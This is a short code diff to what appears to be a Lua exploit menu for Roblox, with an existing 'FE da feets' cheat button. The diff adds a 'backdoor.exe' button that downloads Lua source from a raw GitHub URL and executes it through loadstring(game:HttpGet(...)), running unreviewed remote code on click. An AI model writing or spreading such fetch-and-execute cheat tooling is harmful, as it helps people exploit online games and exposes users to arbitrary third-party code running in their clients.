@@ -1254,6 +1254,9 @@ Section:NewButton("FE da feets", "credit to Ice & Fire#0001", function()
 	end
 end)
 
+Section:NewButton("backdoor.exe", "backdoor.exe got updated to V4", function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()
+end)
 
 -- Start of the second Tab Holder
 
